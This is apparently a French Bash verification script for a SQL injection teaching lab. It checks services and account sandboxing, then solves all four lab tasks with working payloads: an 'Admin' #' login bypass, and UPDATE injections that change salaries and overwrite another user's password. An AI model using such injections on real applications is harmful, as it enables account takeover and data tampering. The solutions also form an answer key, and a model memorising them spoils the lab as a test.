#!/usr/bin/env bash
# Vérifie l'instance réellement déployée par le playbook Ansible, en passant par les
# mêmes interfaces qu'un étudiant : HTTP sur 127.0.0.1, MySQL sur 127.0.0.1:3306 et
# le validateur /usr/local/bin/sqllab exécuté sous le compte seed.
set -uo pipefail

CHECKER=/usr/local/bin/sqllab
DEFENSE=/home/seed/lab/defense/unsafe.php
REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
WORK="$(mktemp -d)"
COOKIES="$WORK/alice.cookies"
FAIL=0

ok()  { echo "  [OK]   $1"; }
ko()  { echo "  [FAIL] $1"; FAIL=1; }
chk() { if eval "$1" >/dev/null 2>&1; then ok "$2"; else ko "$2"; fi; }

web()  { curl --fail --silent --show-error --header 'Host: www.seed-server.com' "http://127.0.0.1$1"; }
sqlro() { mysql --protocol=TCP --host=127.0.0.1 --user=student_ro --password=dees \
            --skip-column-names --batch --execute="$1" sqllab_users; }
as_seed() { sudo -u seed "$@"; }

echo "Service et ports"
chk "sudo systemctl is-active seed-sqli.service | grep -q '^active'" "l'unité seed-sqli est active"
chk "curl -fsS --header 'Host: www.seed-server.com' -o /dev/null http://127.0.0.1/healthz.php" "l'application répond sur 127.0.0.1:80"
chk "mysql --protocol=TCP --host=127.0.0.1 --user=student_ro --password=dees --execute='SELECT 1' sqllab_users" "MySQL répond sur 127.0.0.1:3306"

echo
echo "Application vulnérable (comme l'étudiant)"
chk "web / | grep -Fq 'Employee Management'" "page de connexion servie"
admin="$(web '/unsafe_home.php?username=Admin%27%20%23&Password=x' || true)"
for m in 'User Details' Alice Boby 99999; do
  if grep -Fq "$m" <<<"$admin"; then ok "l'injection sur SELECT expose : $m"; else ko "injection SELECT, absent : $m"; fi
done

echo
echo "Compte MySQL de l'étudiant (lecture seule)"
chk "[ \"\$(sqlro 'SELECT COUNT(*) FROM credential')\" = 6 ]" "les 6 employés sont présents"
if sqlro "UPDATE credential SET Salary=1 WHERE Name='Alice'" >/dev/null 2>&1; then
  ko "student_ro a pu MODIFIER la base (il doit être en lecture seule)"
else
  ok "student_ro ne peut pas modifier la base"
fi

echo
echo "Validateur et cloisonnement du compte étudiant"
chk "[ \"\$(stat -c '%a %U %G' $CHECKER)\" = '4711 root root' ]" "validateur en 4711 root:root"
chk "sudo $CHECKER --selftest | grep -q ." "auto-test du validateur"
chk "! sudo -u seed cat $CHECKER" "l'étudiant ne peut pas lire le validateur"
chk "sudo -l -U seed | grep -q reset-sqllab" "l'étudiant garde la commande de remise à zéro"
chk "! sudo -l -U seed | grep -qE '\\(ALL( : ALL)?\\) ALL'" "l'étudiant n'a aucun sudo général"
chk "! id -nG seed | tr ' ' '\\n' | grep -qx docker" "l'étudiant n'est pas dans le groupe docker"

echo
echo "Les 4 épreuves, résolues sous le compte seed"
expect() { grep -Fq "$1" <<<"$2" || return 1; }

out="$(printf '10000\n20000\n10211002\n' | as_seed "$CHECKER" check 1 2>&1)"
if expect "$FLAG1" "$out"; then ok "épreuve 1 : lecture de la fiche d'Alice"; else ko "épreuve 1"; echo "$out" | tail -3; fi

out="$(printf 'Admin%%27%%20%%23\n' | as_seed "$CHECKER" check 2 2>&1)"
if expect "$FLAG2" "$out"; then ok "épreuve 2 : injection sur SELECT"; else ko "épreuve 2"; echo "$out" | tail -3; fi

# Connexion d'Alice puis injections sur l'UPDATE du profil
curl -fsS --cookie-jar "$COOKIES" --cookie "$COOKIES" --header 'Host: www.seed-server.com' \
  'http://127.0.0.1/unsafe_home.php?username=Alice&Password=seedalice' >/dev/null
profile() {
  curl -fsS --location --get --cookie-jar "$COOKIES" --cookie "$COOKIES" \
    --header 'Host: www.seed-server.com' \
    --data-urlencode "NickName=$1" --data-urlencode 'Email=' --data-urlencode 'Address=' \
    --data-urlencode 'Password=' --data-urlencode 'PhoneNumber=' \
    'http://127.0.0.1/unsafe_edit_backend.php' >/dev/null
}
profile "Alice', Salary=60000 WHERE Name='Alice' #"
profile "Alice', Salary=1 WHERE Name='Boby' #"
NEWPWD='Ci-Boby-Password-2026!'
HASH="$(printf '%s' "$NEWPWD" | sha1sum | awk '{print $1}')"
profile "Alice', Password='$HASH' WHERE Name='Boby' #"

out="$(printf '%s\n' "$NEWPWD" | as_seed "$CHECKER" check 3 2>&1)"
if expect "$FLAG3" "$out"; then ok "épreuve 3 : injection sur UPDATE (salaires + mot de passe)"; else ko "épreuve 3"; echo "$out" | tail -3; fi

# Tâche 4 : l'étudiant corrige unsafe.php avec une requête préparée
sudo install -o seed -g seed -m 0644 "$REPO_ROOT/ci/defense-safe.php" "$DEFENSE"
out="$(as_seed "$CHECKER" check 4 2>&1)"
if expect "$FLAG4" "$out"; then ok "épreuve 4 : requête préparée acceptée"; else ko "épreuve 4"; echo "$out" | tail -3; fi

rm -rf -- "$WORK"
echo
if [ "$FAIL" -eq 0 ]; then echo "Instance provisionnée : tous les contrôles sont au vert."; else echo "Des contrôles ont échoué sur l'instance provisionnée."; fi
exit $FAIL
